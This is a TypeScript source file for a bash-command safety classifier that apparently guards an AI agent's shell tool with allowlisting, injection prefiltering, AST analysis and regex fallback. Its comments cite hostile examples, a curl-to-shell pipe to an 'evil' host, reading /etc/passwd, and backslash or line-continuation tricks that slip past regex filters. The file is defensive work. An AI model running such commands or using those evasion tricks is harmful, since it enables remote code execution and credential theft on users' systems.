/**
 * @koi/bash-ast — transitional tool-facing classifier.
 *
 * Provides the external shim that `@koi/tools-bash` uses instead of the
 * regex-only classifier from `@koi/bash-security`. Returns the same
 * `ClassificationResult` shape so the bash tool does not need to reshape
 * its error-handling code.
 *
 * Pipeline:
 *
 *   1. Pre-parse prefilter    — byte-level fast-reject (null bytes, encoded
 *                               traversal, hex-escaped strings, cwd check)
 *   2. AST analysis           — extract SimpleCommand[] or get too-complex
 *   3. Transitional fallback  — too-complex → run the existing regex TTP
 *                               classifier from @koi/bash-security
 *   4. Fail-closed             — parse-unavailable → return not-ok
 *
 * TODO(#1622): once three-state permissions ship, the transitional fallback
 * is deleted and `too-complex` routes to an `ask-user` verdict. The pipeline
 * then collapses to: prefilter → analyze → simple-or-deny.
 */

import {
  type BashPolicy,
  type ClassificationResult,
  detectInjection,
  classifyCommand as regexClassifyTtp,
  validatePath,
} from "@koi/bash-security";
import { analyzeBashCommand } from "./analyze.js";

/** Options accepted by `classifyBashCommand`. Mirrors @koi/bash-security's
 * signature so existing call sites do not need to reshape opts. */
export interface ClassifyOptions {
  readonly cwd?: string;
  readonly policy?: BashPolicy;
  readonly workspaceRoot?: string;
}

/**
 * Full classification pipeline for `@koi/tools-bash`.
 *
 * Returns `{ ok: true }` only if ALL of the following hold:
 *   - The command passes the byte-level prefilter.
 *   - If `cwd` is provided, it resolves inside `workspaceRoot`.
 *   - Either the AST walker produced a `simple` result (AST path) OR the
 *     regex classifier found no known-dangerous TTP pattern (fallback path
 *     for `too-complex` commands). Both checks independently enforce the
 *     denylist.
 *   - The parser was available (not `parse-unavailable`).
 *
 * Sync hot path. Requires `initializeBashAst()` to have resolved before the
 * first call; otherwise returns a fail-closed error.
 */
export function classifyBashCommand(command: string, opts?: ClassifyOptions): ClassificationResult {
  const { cwd, policy, workspaceRoot } = opts ?? {};

  // 1a. Allowlist gate — preserved from @koi/bash-security's classify.ts
  // so policy.allowlist continues to work unchanged.
  if (policy?.allowlist !== undefined && policy.allowlist.length > 0) {
    const allowlisted = policy.allowlist.some((prefix: string) => command.startsWith(prefix));
    if (!allowlisted) {
      return {
        ok: false,
        reason: "Command does not match any configured allowlist prefix",
        pattern: policy.allowlist.join(" | "),
        category: "injection",
      };
    }
    // Compound operators let an attacker chain arbitrary follow-on commands
    // after an allowlisted prefix. Reject them when an allowlist is active.
    const compoundMatch = /[;|&`\n]|\$\(/.exec(command);
    if (compoundMatch !== null) {
      return {
        ok: false,
        reason:
          "Compound command operators are disallowed when an allowlist is active — use a single simple command",
        pattern: compoundMatch[0] ?? "",
        category: "injection",
      };
    }
  }

  // 1b. Pre-parse prefilter — byte-level fast-reject
  const injection = detectInjection(command);
  if (!injection.ok) return injection;

  if (cwd !== undefined) {
    const pathResult = validatePath(cwd, workspaceRoot);
    if (!pathResult.ok) return pathResult;
  }

  // 2. AST analysis
  const analysis = analyzeBashCommand(command);

  switch (analysis.kind) {
    case "simple": {
      // AST produced trustworthy argv for every command. Still run the
      // regex TTP classifier as a defense-in-depth gate — a command with a
      // clean static argv can still be e.g. `curl http://evil | sh` where
      // the pipe segment is a separate SimpleCommand (`sh`) but the regex
      // classifier has extra signal (remote-fetch-pipe-shell pattern).
      return regexClassifyTtp(command);
    }
    case "too-complex": {
      // SECURITY: certain `too-complex` reasons indicate bash source whose
      // raw text does NOT match bash's effective semantics — backslash
      // escapes in unquoted words, inside double-quoted strings, or as
      // line continuations. For these, falling through to the raw-text
      // regex classifier is unsafe: the pattern `/etc/passwd` never
      // matches `\/etc\/passwd` even though bash dispatches them to the
      // same argv, and `curl | bash` never matches `curl | ba\<LF>sh`
      // even though bash collapses the line continuation. Hard-deny
      // these directly instead of falling through.
      if (
        analysis.nodeType === "word" ||
        analysis.nodeType === "string_content" ||
        analysis.nodeType === "prefilter:line-continuation"
      ) {
        return {
          ok: false,
          reason: `Bash source uses shell escape sequences that cannot be safely analysed: ${analysis.reason}`,
          pattern: analysis.nodeType,
          category: "injection",
        };
      }
      // TODO(#1622): delete this fall-through once three-state permissions
      // ship and `too-complex` can route to an ask-user verdict. Until
      // then, we fall through to the existing regex classifier so that
      // common shell patterns ($VAR, $(cmd), for-loops, &&) continue to
      // work without forcing a user prompt for every compound command.
      return regexClassifyTtp(command);
    }
    case "parse-unavailable": {
      // Fail closed. The parser could not run. DO NOT fall through to a
      // permissive path — that would violate the fail-closed invariant.
      return {
        ok: false,
        reason: `Bash AST parser unavailable: ${analysis.cause}`,
        pattern: `parse-unavailable:${analysis.cause}`,
        category: "injection",
      };
    }
  }
}
